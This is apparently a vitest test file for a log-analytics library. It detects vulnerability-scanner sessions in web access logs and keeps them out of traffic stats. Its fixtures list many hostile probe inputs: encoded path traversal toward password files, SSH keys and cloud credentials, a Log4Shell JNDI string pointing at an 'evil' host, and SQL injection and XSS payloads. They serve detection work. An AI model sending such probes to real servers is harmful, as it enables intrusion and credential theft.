import { describe, it, expect } from 'vitest';
import { createClassifier } from '../src/classify.js';
import { createFilter } from '../src/filter.js';
import { detectScanners } from '../src/sessions.js';
import { aggregate } from '../src/aggregate.js';
import {
  DEFAULT_PROBE_PATTERNS,
  DEFAULT_SCANNER_CATEGORIES,
  SCANNER_NAME,
  isProbePath,
  isProbeRequest,
} from '../src/defaults/scanner.js';
import { isSameSiteReferrer } from '../src/sessions.js';
import { CATEGORY_HUMAN, CATEGORY_SCANNER } from '../src/defaults/categories.js';
import type { ClassifiedEntry, LogEntry } from '../src/types.js';

const classify = createClassifier();

const CHROME =
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36';
const FIREFOX = 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:126.0) Gecko/20100101 Firefox/126.0';
const SAFARI_IOS =
  'Mozilla/5.0 (iPhone; CPU iPhone OS 17_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1';
const GOOGLEBOT = 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)';

const T0 = 1_800_000_000;
const SCANNER_IP = '45.138.12.41';

function log(overrides: Partial<LogEntry>): LogEntry {
  return {
    ip: SCANNER_IP,
    timestamp: T0,
    method: 'GET',
    path: '/',
    status: 429,
    size: 5000,
    referrer: null,
    userAgent: CHROME,
    ...overrides,
  };
}

function classified(entries: LogEntry[]): ClassifiedEntry[] {
  return entries.map((entry) => ({ entry, classification: classify(entry.userAgent) }));
}

/** Paths captured from a real scanner session (2026-09-18), plus the fake referrer it sent. */
const SCANNER_SESSION: Array<[number, string, string, string]> = [
  [0, '/.env%20?_=r1pytjgx&v=j4rbs', 'https://news.ycombinator.com/', CHROME],
  [52, '/%2eenv?_=wxpvs6gs&v=fokba', 'https://www.reddit.com/', FIREFOX],
  [179, '/srv/.env?_=8jqh9fuj&v=eyjc7', 'https://www.reddit.com/', CHROME],
  [426, '/aws-credentials?_=iv0g6qst&v=isq9v', 'https://news.ycombinator.com/', SAFARI_IOS],
  [456, '/config/aws.env?_=7i88gpn1&v=js9wc', 'https://www.reddit.com/', FIREFOX],
  [511, '/config/aws.yml?_=nv7yoaeq&v=q36wl', 'https://www.reddit.com/', SAFARI_IOS],
  [
    732,
    '/var/run/secrets/eks.amazonaws.com/serviceaccount/token?_=d7',
    'https://news.ycombinator.com/',
    FIREFOX,
  ],
  [764, '/.docker/config.json?_=09vc5rni&v=uijf8', 'https://www.reddit.com/', FIREFOX],
  [799, '/root/.aws/credentials?_=bspvcb6h&v=1ck6j', 'https://news.ycombinator.com/', CHROME],
  [1043, '/wp-content/debug.log?_=z4nsn88w&v=6kg19', 'https://www.reddit.com/', SAFARI_IOS],
  [1070, '/?_=wgdl22og&rest_route=%2Fwp%2Fv2%2Fusers&v=xns74', 'https://www.reddit.com/', CHROME],
  [1224, '/serverless.yml?_=fiewthjr&v=5nb7r', 'https://www.reddit.com/', SAFARI_IOS],
  [1250, '/docker-compose.yaml?_=l3mrixsq&v=wxfdn', 'https://www.reddit.com/', CHROME],
  [1364, '/application.properties?_=e73e7fhr&v=3x395', 'https://news.ycombinator.com/', FIREFOX],
  [1376, '/appsettings.json?_=u84zughe&v=izj6s', 'https://www.reddit.com/', FIREFOX],
  [1447, '/actuator/configprops?_=8vkyc9qd&v=9jumr', 'https://news.ycombinator.com/', CHROME],
  [1546, '/telescope/api/commands?_=bxuh87kx&v=8z04h', 'https://news.ycombinator.com/', CHROME],
  [1586, '/telescope?_=xxm07i51&v=1qyja', 'https://news.ycombinator.com/', CHROME],
  [1630, '/php_info.php?_=7kfo4ntx&v=rs8ta', 'https://www.reddit.com/', SAFARI_IOS],
  [1770, '/dashboard.css?_=jzrxbuzl&v=qe7zd', 'https://www.reddit.com/', CHROME],
  [1877, '/profile.js?_=o1ufx73o&v=wg8fp', 'https://www.reddit.com/', CHROME],
  [1933, '/account.png?_=n0dqvds0&v=xr0h8', 'https://news.ycombinator.com/', FIREFOX],
  [
    2167,
    '/../var/www/html/configuration.php?_=6ljbjo6w&v=rlu5a',
    'https://news.ycombinator.com/',
    CHROME,
  ],
  [2226, '/../var/log/auth.log?_=wqhujrva&v=3igdo', 'https://news.ycombinator.com/', SAFARI_IOS],
  [2397, '/../../etc/hosts?_=n4z8k2t7&v=ih06x', 'https://news.ycombinator.com/', CHROME],
  [
    2618,
    '/../../home/deploy/.ssh/id_rsa?_=a0noan30&v=l86uu',
    'https://news.ycombinator.com/',
    SAFARI_IOS,
  ],
  [2688, '/../../../etc/shadow?_=l0ju6s56&v=f5tno', 'https://news.ycombinator.com/', CHROME],
  [3160, '/%2e%2e/etc/passwd?_=xmxv9ed3&v=bczbh', 'https://www.reddit.com/', SAFARI_IOS],
  [3436, '/%252e%252e/var/www/html/.env?_=ock701hk&v=w8zzp', 'https://www.reddit.com/', SAFARI_IOS],
  [3835, '/%2f../proc/version?_=htdg41gp&v=g3auz', 'https://www.reddit.com/', CHROME],
  [4082, '/%2e./etc/passwd?_=kp4w87oc&v=xexcl', 'https://www.reddit.com/', CHROME],
  [4148, '/.%2e/proc/version?_=9b70p9uk&v=7zihu', 'https://news.ycombinator.com/', CHROME],
];

function scannerEntries(): LogEntry[] {
  return SCANNER_SESSION.map(([dt, path, referrer, userAgent]) =>
    log({ timestamp: T0 + dt, path, referrer, userAgent }),
  );
}

describe('isProbePath', () => {
  it('matches every probe in the captured scanner session', () => {
    const probes = [
      '/.env%20?_=r1pytjgx&v=j4rbs',
      '/%2eenv?_=wxpvs6gs&v=fokba',
      '/srv/.env?_=8jqh9fuj&v=eyjc7',
      '/aws-credentials?_=iv0g6qst&v=isq9v',
      '/config/aws.env?_=7i88gpn1&v=js9wc',
      '/config/aws.yml?_=nv7yoaeq&v=q36wl',
      '/var/run/secrets/eks.amazonaws.com/serviceaccount/token?_=d7',
      '/.docker/config.json?_=09vc5rni&v=uijf8',
      '/root/.aws/credentials?_=bspvcb6h&v=1ck6j',
      '/wp-content/debug.log?_=z4nsn88w&v=6kg19',
      '/?_=wgdl22og&rest_route=%2Fwp%2Fv2%2Fusers&v=xns74',
      '/serverless.yml?_=fiewthjr&v=5nb7r',
      '/docker-compose.yaml?_=l3mrixsq&v=wxfdn',
      '/.docker.env?_=qffiztt2&v=3mkvx',
      '/storage/logs/laravel.log?_=u2enfp94&v=9wlyz',
      '/application.yml?_=uvx21071&v=oz2so',
      '/application.properties?_=e73e7fhr&v=3x395',
      '/appsettings.json?_=u84zughe&v=izj6s',
      '/actuator/configprops?_=8vkyc9qd&v=9jumr',
      '/telescope/api/commands?_=bxuh87kx&v=8z04h',
      '/php_info.php?_=7kfo4ntx&v=rs8ta',
      '/../var/www/html/configuration.php?_=6ljbjo6w&v=rlu5a',
      '/../../etc/hosts?_=n4z8k2t7&v=ih06x',
      '/../../home/deploy/.ssh/id_rsa?_=a0noan30&v=l86uu',
      '/../../../root/.ssh/id_ed25519?_=hth5q5yc&v=2dccy',
      '/../../../../proc/version?_=w7aztg1k&v=cjmuh',
      '/%2e%2e/etc/passwd?_=xmxv9ed3&v=bczbh',
      '/%2e%2e/%2e%2e/root/.bash_history?_=qhmafg9q&v=gafbn',
      '/%2e%2e/%2e%2e/%2e%2e/var/www/html/.git/config?_=nkl1k349&v=yph9b',
      '/%252e%252e/var/www/html/.env?_=ock701hk&v=w8zzp',
      '/%252e%252e/proc/self/cmdline?_=y76q3grk&v=83ycc',
      '/%2f../proc/version?_=htdg41gp&v=g3auz',
      '/%2f..%2f../.aws/credentials?_=hr0lrrm7&v=eftk8',
      '/%2f..%2f../root/.mysql_history?_=0ebhj6yk&v=eotfr',
      '/%2e./etc/passwd?_=kp4w87oc&v=xexcl',
      '/.%2e/proc/version?_=9b70p9uk&v=7zihu',
      '/wp-login.php',
      '/xmlrpc.php?rsd',
      '/backup.tar.gz',
      '/.env1',
      '/.claude/credentials.json',
      '/root/.codex/auth.json',
      '/.config/gcloud/application_default_credentials.json',
      '/gcp-credentials.json',
      '/_rsc',
      '/wp-includes/wlwmanifest.xml',
      '/administrator/manifests/files/joomla.xml',
      '/wp-content/plugins/woocommerce/readme.txt',
      '/info.php',
      '/phpversion.php',
      '/?x=${jndi:ldap://evil/a}',
      '/search?q=1%27%20union%20select%201,2,3--',
      '/page?name=%3Cscript%3Ealert(1)%3C/script%3E',
      '/?XDEBUG_SESSION_START=phpstorm',
      '/%c0%ae%c0%ae/etc/passwd',
      '/wp-config.php.bak',
      '/cgi-bin/luci/;stok=/locale',
      '/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php',
      '/boaform/admin/formLogin',
    ];
    for (const p of probes) expect(isProbePath(p), p).toBe(true);
  });

  it('does not match content paths', () => {
    const content = [
      '/',
      '/about/',
      '/blog/my-post/',
      '/blog/what-is-a-dot-env-file/',
      '/contact',
      '/llms.txt',
      '/README.md',
      '/docs/configuration/',
      '/environment/',
      '/telescope/',
      '/secrets-of-productivity/',
      '/wp-content/uploads/2026/09/photo.jpg',
      '/api/v2/users',
      '/files/report.pdf',
      '/etc',
      '/old-site/',
      '/api/credentials',
      '/docs/credentials',
      '/downloads/sample.sql',
      '/blog/phpinfo-explained/',
      '/blog/xmlrpc-history/',
      '/.well-known/traffic-advice',
      '/.well-known/assetlinks.json',
      '/_next/data/abc/index.json',
    ];
    for (const p of content) expect(isProbePath(p), p).toBe(false);
  });

  it('accepts custom patterns', () => {
    expect(isProbePath('/custom-probe', [/custom-probe/])).toBe(true);
    expect(isProbePath('/.env', [/custom-probe/])).toBe(false);
  });
});

describe('createFilter probe patterns', () => {
  const shouldSkip = createFilter();
  const entry = (path: string) => log({ path });

  it('skips path traversal in any encoding', () => {
    expect(shouldSkip(entry('/../../etc/hosts'))).toBe(true);
    expect(shouldSkip(entry('/%2e%2e/etc/passwd'))).toBe(true);
    expect(shouldSkip(entry('/%252e%252e/var/www/html/index.html'))).toBe(true);
    expect(shouldSkip(entry('/%2f../proc/version'))).toBe(true);
  });

  it('skips credential and config file probes', () => {
    expect(shouldSkip(entry('/aws-credentials'))).toBe(true);
    expect(shouldSkip(entry('/home/deploy/.ssh/id_rsa'))).toBe(true);
    expect(shouldSkip(entry('/serverless.yml'))).toBe(true);
    expect(shouldSkip(entry('/application.properties'))).toBe(true);
    expect(shouldSkip(entry('/?rest_route=%2Fwp%2Fv2%2Fusers'))).toBe(true);
  });

  it('still allows content pages', () => {
    expect(shouldSkip(entry('/'))).toBe(false);
    expect(shouldSkip(entry('/blog/what-is-a-dot-env-file/'))).toBe(false);
    expect(shouldSkip(entry('/docs/configuration/'))).toBe(false);
  });

  it('can be disabled with an empty skipPatterns', () => {
    const noPatterns = createFilter({ skipPatterns: [] });
    expect(noPatterns(entry('/../../etc/hosts'))).toBe(false);
    // Substring defaults still apply
    expect(noPatterns(entry('/.env'))).toBe(true);
  });
});

describe('detectScanners', () => {
  it('relabels the whole session of a scanner IP, including non-probe requests', () => {
    const input = classified(scannerEntries());
    expect(input.every((e) => e.classification.category === CATEGORY_HUMAN)).toBe(true);

    const out = detectScanners(input, 'example.com');
    expect(out.every((e) => e.classification.category === CATEGORY_SCANNER)).toBe(true);
    expect(out.every((e) => e.classification.botName === SCANNER_NAME)).toBe(true);

    // Existence checks that no probe pattern matches are relabelled with the rest
    const residual = out.filter((e) => !isProbePath(e.entry.path));
    expect(residual.map((e) => e.entry.path.split('?')[0])).toEqual([
      '/telescope',
      '/dashboard.css',
      '/profile.js',
      '/account.png',
    ]);
    expect(residual.every((e) => e.classification.category === CATEGORY_SCANNER)).toBe(true);
  });

  it('does not touch other IPs', () => {
    const visitor = [
      log({ ip: '9.9.9.9', path: '/', referrer: 'https://news.ycombinator.com/' }),
      log({ ip: '9.9.9.9', path: '/about/', referrer: 'https://example.com/', timestamp: T0 + 30 }),
    ];
    const out = detectScanners(classified([...scannerEntries(), ...visitor]), 'example.com');
    const v = out.filter((e) => e.entry.ip === '9.9.9.9');
    expect(v.every((e) => e.classification.category === CATEGORY_HUMAN)).toBe(true);
  });

  it('requires minProbes probe requests', () => {
    const two = scannerEntries().slice(0, 2);
    const out = detectScanners(classified(two), 'example.com');
    expect(out.every((e) => e.classification.category === CATEGORY_HUMAN)).toBe(true);

    const lowered = detectScanners(classified(two), 'example.com', { minProbes: 2 });
    expect(lowered.every((e) => e.classification.category === CATEGORY_SCANNER)).toBe(true);
  });

  it('leaves requests outside the window untouched', () => {
    const later = log({
      path: '/',
      timestamp: T0 + 4148 + 3 * 3600,
      referrer: 'https://www.reddit.com/',
    });
    const earlier = log({ path: '/pricing/', timestamp: T0 - 2 * 3600 });
    const out = detectScanners(classified([...scannerEntries(), later, earlier]), 'example.com');
    const far = out.filter((e) => e.entry.path === '/' && e.entry.timestamp === later.timestamp);
    expect(far[0].classification.category).toBe(CATEGORY_HUMAN);
    expect(out.find((e) => e.entry.path === '/pricing/')!.classification.category).toBe(
      CATEGORY_HUMAN,
    );

    const wide = detectScanners(classified([...scannerEntries(), later]), 'example.com', {
      windowSeconds: 4 * 3600,
    });
    expect(wide.find((e) => e.entry.timestamp === later.timestamp)!.classification.category).toBe(
      CATEGORY_SCANNER,
    );
  });

  it('never touches an IP+UA pair that navigated with a same-site referrer', () => {
    // A person behind the same NAT as the scanner, clicking through the site
    const person = [
      log({ path: '/', userAgent: SAFARI_IOS + ' Person', timestamp: T0 + 100 }),
      log({
        path: '/about/',
        userAgent: SAFARI_IOS + ' Person',
        timestamp: T0 + 130,
        referrer: 'https://example.com/',
      }),
    ];
    const out = detectScanners(classified([...scannerEntries(), ...person]), 'example.com');
    const p = out.filter((e) => e.entry.userAgent.endsWith('Person'));
    expect(p.length).toBe(2);
    expect(p.every((e) => e.classification.category === CATEGORY_HUMAN)).toBe(true);
  });

  it('never touches self-identifying bots from the same IP', () => {
    const bot = log({ path: '/', userAgent: GOOGLEBOT, timestamp: T0 + 10 });
    const out = detectScanners(classified([...scannerEntries(), bot]), 'example.com');
    const g = out.find((e) => e.entry.userAgent === GOOGLEBOT)!;
    expect(g.classification.category).toBe('search-crawler');
  });

  it('demotes programmatic scanners too', () => {
    const curl = [0, 30, 60, 90].map((dt) =>
      log({ path: `/.git/config?x=${dt}`, userAgent: 'curl/8.5.0', timestamp: T0 + dt }),
    );
    const out = detectScanners(classified(curl), 'example.com');
    expect(out.every((e) => e.classification.category === CATEGORY_SCANNER)).toBe(true);
    expect(DEFAULT_SCANNER_CATEGORIES).toContain('programmatic');
  });

  it('respects a restricted categories option', () => {
    const curl = [0, 30, 60, 90].map((dt) =>
      log({ path: `/.git/config?x=${dt}`, userAgent: 'curl/8.5.0', timestamp: T0 + dt }),
    );
    const out = detectScanners(classified(curl), 'example.com', { categories: [CATEGORY_HUMAN] });
    expect(out.every((e) => e.classification.category === 'programmatic')).toBe(true);
  });

  it('preserves the proxyDuplicate marker', () => {
    const input = classified(scannerEntries());
    input[0] = {
      ...input[0],
      classification: { ...input[0].classification, proxyDuplicate: true },
    };
    const out = detectScanners(input, 'example.com');
    expect(out[0].classification.proxyDuplicate).toBe(true);
    expect(out[0].classification.category).toBe(CATEGORY_SCANNER);
  });

  it('returns the same array when no scanner is found', () => {
    const input = classified([log({ ip: '9.9.9.9', path: '/' })]);
    expect(detectScanners(input, 'example.com')).toBe(input);
  });

  it('uses custom probe patterns', () => {
    const custom = [0, 30, 60].map((dt) => log({ path: '/custom-probe', timestamp: T0 + dt }));
    const out = detectScanners(classified(custom), 'example.com', {
      probePatterns: [/custom-probe/],
    });
    expect(out.every((e) => e.classification.category === CATEGORY_SCANNER)).toBe(true);
    const dflt = detectScanners(classified(custom), 'example.com');
    expect(dflt.every((e) => e.classification.category === CATEGORY_HUMAN)).toBe(true);
  });
});

describe('isProbeRequest', () => {
  const req = (over: Partial<LogEntry>) => log({ status: 404, ...over });

  it('counts a probe path only on a 4xx answer', () => {
    expect(isProbeRequest(req({ path: '/wp-login.php', status: 404 }))).toBe(true);
    expect(isProbeRequest(req({ path: '/wp-login.php', status: 429 }))).toBe(true);
    expect(isProbeRequest(req({ path: '/wp-login.php', status: 200 }))).toBe(false);
    expect(isProbeRequest(req({ path: '/docker-compose.yml', status: 200 }))).toBe(false);
    expect(isProbeRequest(req({ path: '/wp-login.php', status: 302 }))).toBe(false);
  });

  it('counts a probe in the query string regardless of status', () => {
    expect(isProbeRequest(req({ path: '/?rest_route=%2Fwp%2Fv2%2Fusers', status: 200 }))).toBe(
      true,
    );
    expect(isProbeRequest(req({ path: '/?x=${jndi:ldap://a/b}', status: 200 }))).toBe(true);
  });

  it('counts unusual methods on any 4xx', () => {
    expect(isProbeRequest(req({ path: '/', method: 'PROPFIND', status: 405 }))).toBe(true);
    expect(isProbeRequest(req({ path: '/', method: 'TRACE', status: 403 }))).toBe(true);
    expect(isProbeRequest(req({ path: '/', method: 'CONNECT', status: 400 }))).toBe(true);
    expect(isProbeRequest(req({ path: '/', method: 'OPTIONS', status: 404 }))).toBe(false);
  });

  it('counts write methods only against missing targets', () => {
    expect(isProbeRequest(req({ path: '/_next/data', method: 'POST', status: 404 }))).toBe(true);
    expect(isProbeRequest(req({ path: '/api/action', method: 'POST', status: 405 }))).toBe(true);
    expect(isProbeRequest(req({ path: '/api/login', method: 'POST', status: 401 }))).toBe(false);
    expect(isProbeRequest(req({ path: '/api/items', method: 'POST', status: 422 }))).toBe(false);
    expect(isProbeRequest(req({ path: '/contact', method: 'POST', status: 200 }))).toBe(false);
  });

  it('ignores ordinary GETs', () => {
    expect(isProbeRequest(req({ path: '/missing-page/', status: 404 }))).toBe(false);
    expect(isProbeRequest(req({ path: '/about/', status: 200 }))).toBe(false);
  });
});

describe('isSameSiteReferrer', () => {
  it('compares hosts, not substrings', () => {
    expect(isSameSiteReferrer('https://example.com/page', 'example.com')).toBe(true);
    expect(isSameSiteReferrer('https://www.example.com/', 'example.com')).toBe(true);
    expect(isSameSiteReferrer('https://docs.example.com/', 'example.com')).toBe(true);
    expect(isSameSiteReferrer('https://example.com/', 'www.example.com')).toBe(true);
    expect(isSameSiteReferrer('https://www.google.com/search?q=example.com', 'example.com')).toBe(
      false,
    );
    expect(isSameSiteReferrer('https://notexample.com/', 'example.com')).toBe(false);
    expect(isSameSiteReferrer('https://example.com.evil.net/', 'example.com')).toBe(false);
  });

  it('rejects empty, dash, and unparseable referrers', () => {
    expect(isSameSiteReferrer(null, 'example.com')).toBe(false);
    expect(isSameSiteReferrer('-', 'example.com')).toBe(false);
    expect(isSameSiteReferrer('example.com/page', 'example.com')).toBe(false);
  });
});

describe('detectScanners burst and status guards', () => {
  it('does not flag a crawler whose probes are hours apart', () => {
    // A benchmark crawler that HEADs /wp-admin/ once per visit, three visits over a day
    const crawler = [0, 10 * 3600, 20 * 3600].flatMap((base) => [
      log({ ip: '7.7.7.7', path: '/', status: 200, timestamp: T0 + base, userAgent: CHROME }),
      log({
        ip: '7.7.7.7',
        path: '/wp-admin/',
        method: 'HEAD',
        status: 404,
        timestamp: T0 + base + 5,
        userAgent: CHROME,
      }),
      log({
        ip: '7.7.7.7',
        path: '/post/',
        status: 200,
        timestamp: T0 + base + 9,
        userAgent: CHROME,
      }),
    ]);
    const out = detectScanners(classified(crawler), 'example.com');
    expect(out.every((e) => e.classification.category === CATEGORY_HUMAN)).toBe(true);
    // The same three probes inside one window do qualify
    const burst = crawler.map((e, i) => ({ ...e, timestamp: T0 + i * 10 }));
    const out2 = detectScanners(classified(burst), 'example.com');
    expect(out2.every((e) => e.classification.category === CATEGORY_SCANNER)).toBe(true);
  });

  it('does not count probe paths that the site actually serves', () => {
    const admin = [0, 20, 40, 60].map((dt) =>
      log({ ip: '8.8.8.8', path: '/wp-login.php', status: 200, timestamp: T0 + dt }),
    );
    const out = detectScanners(classified(admin), 'example.com');
    expect(out.every((e) => e.classification.category === CATEGORY_HUMAN)).toBe(true);
  });

  it('never touches isbot-detected bots, but does catch a bare Mozilla/5.0', () => {
    const sweep = (ua: string, ip: string) =>
      [0, 20, 40, 60].map((dt) =>
        log({ ip, userAgent: ua, path: `/.env.${dt}`, status: 404, timestamp: T0 + dt }),
      );
    const bot = 'Mozilla/5.0 (compatible; SomeCrawler/1.0; +https://example.org/bot)';
    const out = detectScanners(
      classified([...sweep(bot, '5.5.5.5'), ...sweep('Mozilla/5.0', '6.6.6.6')]),
      'example.com',
    );
    expect(
      out
        .filter((e) => e.entry.ip === '5.5.5.5')
        .every((e) => e.classification.category === 'other-bot'),
    ).toBe(true);
    expect(
      out
        .filter((e) => e.entry.ip === '6.6.6.6')
        .every((e) => e.classification.category === CATEGORY_SCANNER),
    ).toBe(true);
    expect(classify('Mozilla/5.0').category).toBe('unknown');
    expect(classify('Mozilla/4.0 (compatible)').category).toBe('unknown');
  });

  it('is not fooled by a fake referrer that mentions the domain', () => {
    const spoof = scannerEntries().map((e) => ({
      ...e,
      referrer: 'https://www.google.com/search?q=example.com',
    }));
    const out = detectScanners(classified(spoof), 'example.com');
    expect(out.every((e) => e.classification.category === CATEGORY_SCANNER)).toBe(true);
  });

  it('catches POST-only RCE probes', () => {
    const rsc = ['/_rsc', '/rsc', '/api/rsc', '/_next', '/_next/data', '/api/action'].map(
      (path, i) => log({ ip: '4.4.4.4', path, method: 'POST', status: 404, timestamp: T0 + i * 3 }),
    );
    const out = detectScanners(classified(rsc), 'example.com');
    expect(out.every((e) => e.classification.category === CATEGORY_SCANNER)).toBe(true);
  });

  it('accepts a full isProbe override', () => {
    const custom = [0, 30, 60].map((dt) =>
      log({ path: '/honeypot', status: 200, timestamp: T0 + dt }),
    );
    const out = detectScanners(classified(custom), 'example.com', {
      isProbe: (e) => e.path === '/honeypot',
    });
    expect(out.every((e) => e.classification.category === CATEGORY_SCANNER)).toBe(true);
  });
});

describe('scanner user agents in the bot database', () => {
  it.each([
    ['zgrab/0.x', 'zgrab'],
    [
      'Mozilla/5.0 (compatible; Nuclei - Open-source project (github.com/projectdiscovery/nuclei))',
      'Nuclei',
    ],
    ['Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)', 'CensysInspect'],
    ['Expanse, a Palo Alto Networks company, searches across the global IPv4 space', 'Expanse'],
    ['crusader-worker/1.0', 'crusader-worker'],
    ['Mozilla/5.0 (X11; Linux x86_64) sppb-rce-poc', 'SP Page Builder RCE probe'],
    ['cve-2026-63030/1.0', 'CVE probe'],
    ['sqlmap/1.8', 'sqlmap'],
  ])('classifies %s as scanner', (ua, name) => {
    const r = classify(ua);
    expect(r.category).toBe(CATEGORY_SCANNER);
    expect(r.botName).toBe(name);
  });
});

describe('detectScanners + aggregate', () => {
  it('keeps fake referrers out of topReferrers and reports the scanner category', () => {
    const visitor = [
      log({ ip: '9.9.9.9', path: '/', referrer: 'https://news.ycombinator.com/', status: 200 }),
      log({
        ip: '9.9.9.9',
        path: '/about/',
        referrer: 'https://example.com/',
        status: 200,
        timestamp: T0 + 30,
      }),
    ];
    const entries = detectScanners(classified([...scannerEntries(), ...visitor]), 'example.com');
    const [day] = aggregate(entries, { domain: 'example.com', shouldSkip: createFilter() });

    const refs = Object.fromEntries(day.topReferrers.map((r) => [r.referrer, r.count]));
    expect(refs['https://news.ycombinator.com/']).toBe(1);
    expect(refs['https://www.reddit.com/']).toBeUndefined();

    expect(day.summary.byCategory.human.requests).toBe(2);
    expect(day.summary.byCategory.scanner.requests).toBeGreaterThan(0);
    // Scanner paths never reach topPaths
    expect(day.topPaths.every((p) => ['/', '/about/'].includes(p.path))).toBe(true);
  });

  it('shows the full scanner volume when probe filtering is disabled', () => {
    const entries = detectScanners(classified(scannerEntries()), 'example.com');
    const [day] = aggregate(entries, {
      domain: 'example.com',
      shouldSkip: createFilter({ skipPatterns: [], skipSubstrings: [] }),
    });
    expect(day.summary.byCategory.scanner.requests).toBeGreaterThan(20);
    expect(day.topReferrers).toEqual([]);
  });

  it('DEFAULT_PROBE_PATTERNS is a non-empty regex list', () => {
    expect(DEFAULT_PROBE_PATTERNS.length).toBeGreaterThan(10);
    expect(DEFAULT_PROBE_PATTERNS.every((re) => re instanceof RegExp)).toBe(true);
  });
});
